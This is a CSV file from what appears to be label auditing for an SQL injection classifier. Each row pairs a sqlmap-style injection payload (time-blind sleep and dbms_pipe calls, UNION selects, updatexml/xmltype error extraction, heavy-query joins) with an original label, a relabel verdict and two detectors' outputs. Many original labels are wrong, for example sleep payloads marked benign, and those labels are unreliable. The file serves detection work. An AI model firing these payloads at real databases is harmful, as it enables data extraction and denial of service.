payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,19000,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805
"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'updatexml' (likely false negative),boolean_blind,mysql,19001,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --"
"-4947' in boolean mode ) union all select 3314,3314#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19002,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-4947' in boolean mode ) union all select 3314,3314#"
"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19003,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--"
1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,19004,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #
1'|| ( select 'xqqp' where 3007 = 3007 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,19005,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'|| ( select 'xqqp' where 3007 = 3007 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #
"1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,19006,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( '%' = '"
"-5218 ) union all select 9677,9677#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19007,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5218 ) union all select 9677,9677#"
"1' in boolean mode ) union all select null,null,null--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19008,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' in boolean mode ) union all select null,null,null--"
"1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mmgx"" like ""mmgx",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'xmltype' (likely false negative),error_based,oracle,19009,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""mmgx"" like ""mmgx"
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'dbms_pipe' (likely false negative),time_blind,oracle,19010,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""%"" = """
"-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,2163,2163,2163,2163--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,oracle,19011,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"-6789'|| ( select 'uckz' from dual where 2163 = 2163 union all select 2163,2163,2163,2163,2163,2163--"
1' in boolean mode ) rlike sleep ( 5 ) #,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'sleep' (likely false negative),time_blind,mysql,19012,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' in boolean mode ) rlike sleep ( 5 ) #
"1' ) where 7658 = 7658 union all select null,null#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19013,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) where 7658 = 7658 union all select null,null#"
"-7065'+ ( select 'bdxr' where 1756 = 1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19014,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7065'+ ( select 'bdxr' where 1756 = 1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#"
"-8588' union all select 2135,2135--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,19015,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-8588' union all select 2135,2135--"
"1"" where 3247 = 3247 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,Multiple all_users table join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,19016,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 3247 = 3247 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
select ( case when ( 5796 = 8326 ) then 5796 else 5796* ( select 5796 from information_schema.character_sets ) end ) #,heavy_query,db2,0.85,Multiple information_schema join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,mysql,19017,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 5796 = 8326 ) then 5796 else 5796* ( select 5796 from information_schema.character_sets ) end ) #
"-5478"" ) where 4100 = 4100 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,dbms_utility for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,19018,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"-5478"" ) where 4100 = 4100 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
"1"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,firebird,0.85,Multiple domain tables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,19019,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""vudj"" like ""vudj",heavy_query,firebird,0.85,Multiple domain tables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,19020,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""vudj"" like ""vudj"
"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ayqn' like 'ayqn",error_based,mysql,0.85,updatexml for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,19021,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'ayqn' like 'ayqn"
"1' in boolean mode ) and elt ( 1210 = 1210,sleep ( 5 ) ) #",time_blind,mysql,0.9,elt() with sleep for time blind,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,19022,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' in boolean mode ) and elt ( 1210 = 1210,sleep ( 5 ) ) #"
"1' ) ) as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,19023,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --"
"1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.85,extractvalue for error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,19024,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --"
end and ( ( '%' = ',heavy_query,sqlite,0.9,randomblob for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,19025,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,end and ( ( '%' = '
"1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--",heavy_query,postgresql,0.9,generate_series for heavy query,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,19026,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--"
-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq,union_based,generic,0.85,UNION ALL for union-based,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,19027,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq
"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'msjw' like 'msjw",union_based,generic,0.85,UNION ALL for union-based,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,firebird,19028,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'msjw' like 'msjw"
"1 ) where 5465 = 5465 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.85,Multiple systables join,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,19029,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1 ) where 5465 = 5465 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
